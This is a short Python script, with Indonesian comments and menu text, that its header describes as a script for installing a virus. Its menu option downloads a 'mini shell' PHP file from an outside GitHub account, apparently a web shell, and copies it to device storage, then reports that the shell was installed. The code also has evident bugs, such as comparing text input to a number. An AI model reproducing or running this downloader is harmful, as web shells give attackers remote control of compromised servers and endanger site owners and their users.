#!/usr/bin/python
#Full Coding By MrFukuro
#Script Untuk Install Virus

from tqdm import tqdm
import os
import sys
import platform
import requests
from time import sleep

#---(((Color)))---#
M = '\033[1;31m' #red
H = '\033[1;32m' #green
K = '\033[1;33m' #yellow
U = '\033[1;34m' #purple
P = '\033[1;35m' #pink
C = '\033[1;36m' #cyan
W = '\033[1;37m' #white
selesai = (H+"BERHASIL MENGINSTALL SHELL") 
lagi = (P+"SHELL SUDAH ADA DI RUANG INTERNAL ANDA") 
sekali = (C+"SILAHKAN DI LIHAT ^_^") 

def mabar():
	print
	print(""+K+" MENU :") 
	print
	print(""+H+"     ["+W+"1"+H+"]"+C+" DOWNLOAD MINI SHELL"+U+" ("+W+"V1"+H+")") 
	print(""+H+"     ["+W+"2"+H+"]"+C+" DOWNLOAD MINI SHELL"+U+" ("+W+"V2"+H+")")
	print
	print(""+H+"     ["+W+"X"+H+"]"+M+" KEMBALI")
	
	try:
		print
		menu = input(""+K+"Pilih Menu ~> "+C+"") 
		if menu ==  1:
			print(""+P+"") 
			chunk_size = 1024
			url = 'https://github.com/MiniShellX666X/Shell/blob/master/sh.php?raw=true' 
			r = requests.get(url, stream = True)
			size = int(r.headers['content-length'])
			filename = url.split('/')[-1]
			with open(filename, 'wb') as f:
				for data in tqdm(iterable = r.iter_content(chunk_size = chunk_size),total = size/chunk_size, unit = ' KB'):
					f.write(data)
					os.system("cp 'sh.php?raw=true' /sdcard/ShellV1.php")
					
		elif menu == 2:
			print(sekali)
			
		elif(menu =='X' or menu == 'x'):
			sys.exit()
					
		else:
			print(""+M+"{-} Cek Kembali Nomor Yang Anda Pilih! ")
			sleep(2)
			os.system("clear")
			mabar()
	except Exception:
		print(""+M+"Tidak Nomor Yang Anda Pilih! ")
		sleep(1.4)
		os.system("clear") 
		mabar() 
		
if __name__ == "__main__":

	os.system("clear")
	mabar()
	sys.exit()
		



